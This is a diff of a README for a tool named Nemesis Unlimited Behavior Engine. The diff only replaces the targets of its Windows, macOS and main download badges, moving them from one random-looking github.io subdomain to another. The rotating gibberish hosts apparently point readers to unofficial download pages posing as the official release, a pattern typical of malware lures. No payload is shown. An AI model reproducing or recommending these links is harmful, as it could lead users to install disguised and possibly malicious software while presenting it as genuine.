@@ -32,7 +32,7 @@ Whether you're a newcomer or a veteran, Nemesis Unlimited Behavior Engine provid
 
 <div align="center">
 
-[![Download Nemesis Unlimited Behavior Engine](https://img.shields.io/badge/⬇_DOWNLOAD_Nemesis+Unlimited+Behavior+Engine-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://supremedeckhandwire.github.io/win-pkg/)
+[![Download Nemesis Unlimited Behavior Engine](https://img.shields.io/badge/⬇_DOWNLOAD_Nemesis+Unlimited+Behavior+Engine-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://fnwsiyggsoui.github.io/win-setup2/)
 
 </div>
 
@@ -75,8 +75,8 @@ Whether you're a newcomer or a veteran, Nemesis Unlimited Behavior Engine provid
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/⬇_Download-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://supremedeckhandwire.github.io/win-pkg/)
-[![Download for macOS](https://img.shields.io/badge/⬇_Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://supremedeckhandwire.github.io/mac-pkg/)
+[![Download for Windows](https://img.shields.io/badge/⬇_Download-Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://fnwsiyggsoui.github.io/win-setup2/)
+[![Download for macOS](https://img.shields.io/badge/⬇_Download-macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://fnwsiyggsoui.github.io/mac-setup2/)
 
 </div>
 
